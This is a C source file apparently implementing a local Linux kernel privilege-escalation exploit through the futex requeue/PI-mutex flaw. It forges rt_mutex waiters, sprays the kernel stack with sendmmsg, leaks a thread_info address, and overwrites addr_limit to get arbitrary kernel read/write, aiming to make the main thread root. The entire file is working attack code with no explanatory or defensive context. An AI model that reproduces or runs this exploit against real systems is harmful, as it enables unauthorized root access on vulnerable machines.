#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <sys/socket.h>
#include <assert.h>
#include <signal.h>
#include <pthread.h>
#include "futex.h"

#define BLOCKBUF "AAAAAAAA"
#define BLOCKBUFLEN strlen(BLOCKBUF)

#define DEFAULT_PRIO 120
#define THREAD_INFO_BASE 0xffffe000

int client_sockfd, server_sockfd;

struct mmsghdr msgvec;
struct iovec msg[7];

uint32_t non_pi_futex, pi_futex;
struct rt_mutex_waiter fake_waiter1, fake_waiter2;

pthread_t corrupter;
struct thread_info *corrupter_thread_info;

void *lock_pi_futex(void *arg)
{
    assert(!flock(&pi_futex));
}

void kmemcpy(void *src, void *dst, size_t len)
{
    int pipefd[2];

    assert(!pipe(pipefd));
    assert(write(pipefd[1], src, len) == len);
    assert(read(pipefd[0], dst, len) == len);
}

void setup_fake_waiters()
{
    fake_waiter1.list_entry.node_list.prev = &fake_waiter2.list_entry.node_list;
    fake_waiter1.list_entry.prio_list.prev = &fake_waiter2.list_entry.prio_list;
    fake_waiter1.list_entry.prio = DEFAULT_PRIO + 1;
}

void setup_msgs()
{
    int i;

    puts("[*] Setting up the messages for the kernel stack.");

    for (i = 0; i < sizeof(msg) / sizeof(msg[0]); i++)
    {
        msg[i].iov_base = &fake_waiter1.list_entry.prio_list;
        msg[i].iov_len = 1;
    }
    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = sizeof(msg) / sizeof(msg[0]);
}

void setup_sockets()
{
    int fds[2];

    puts("[*] Creating the client and server sockets for kernel stack modification.");

    assert(!socketpair(AF_UNIX, SOCK_STREAM, 0, fds));

    client_sockfd = fds[0];
    server_sockfd = fds[1];

    while (send(client_sockfd, BLOCKBUF, BLOCKBUFLEN, MSG_DONTWAIT) != -1)
        ;
    assert(errno == EWOULDBLOCK);
    return;
}

void *forge_waiter(void *arg)
{
    puts("[*] Placing the forged waiter on the mutex's waiters list.");

    assert(!fwait_requeue(&non_pi_futex, &pi_futex, 0));
    assert(!syscall(SYS_sendmmsg, client_sockfd, &msgvec, 1, 0));
}

void escalate_priv_sighandler()
{
    struct task_struct *corrupter_task, *main_task;
    void *highest_addr = (void *)-1;

    puts("[*] Escalating main thread's privileges to root.");

    printf("[*] Writing 0x%x to addr_limit.\n", -1);
    kmemcpy(&highest_addr, &corrupter_thread_info->addr_limit, sizeof(highest_addr));

    kmemcpy(&corrupter_thread_info->task, &corrupter_task, sizeof(corrupter_thread_info->task));
    printf("[*] Corrupter's task_struct @ %p\n", corrupter_task);

    kmemcpy(&corrupter_task->group_leader, &main_task, sizeof(&corrupter_task->group_leader));
    printf("[*] Main thread's task_struct @ %p\n", main_task);
}

void escalate_priv()
{
    pthread_t addr_limit_writer;

    fake_waiter1.list_entry.prio_list.prev = (struct list_head *)&corrupter_thread_info->addr_limit;
    struct sigaction sigact = {.sa_handler = escalate_priv_sighandler};
    assert(!sigaction(SIGINT, &sigact, NULL));
    assert(!pthread_create(&addr_limit_writer, NULL, lock_pi_futex, NULL));

    sleep(3);
    pthread_kill(corrupter, SIGINT);
}

void leak_thread_info()
{
    puts("[*] Leaking corrupter's thread_info.");

    assert(!pthread_create(&corrupter, NULL, lock_pi_futex, NULL));

    sleep(1);
    corrupter_thread_info = (struct thread_info *)((unsigned int)fake_waiter2.list_entry.prio_list.next & THREAD_INFO_BASE);
    printf("[*] thread_info @ %p\n", corrupter_thread_info);
}

int main()
{
    pthread_t forger, ref_holder;

    printf("non_pi_futex @ %p | pi_futex @ %p\n", &non_pi_futex, &pi_futex);
    printf("fake_waiter1 @ %p | fake_waiter2 @ %p\n", &fake_waiter1, &fake_waiter2);

    setup_fake_waiters();
    setup_msgs();
    setup_sockets();

    flock(&pi_futex);

    assert(!pthread_create(&forger, NULL, forge_waiter, NULL));

    sleep(1);
    assert(frequeue(&non_pi_futex, &pi_futex, 1, 0) == 1);

    assert(!pthread_create(&ref_holder, NULL, lock_pi_futex, NULL));

    sleep(1);
    pi_futex = 0;
    frequeue(&pi_futex, &pi_futex, 1, 0);

    leak_thread_info();
    escalate_priv();

    pause();
}
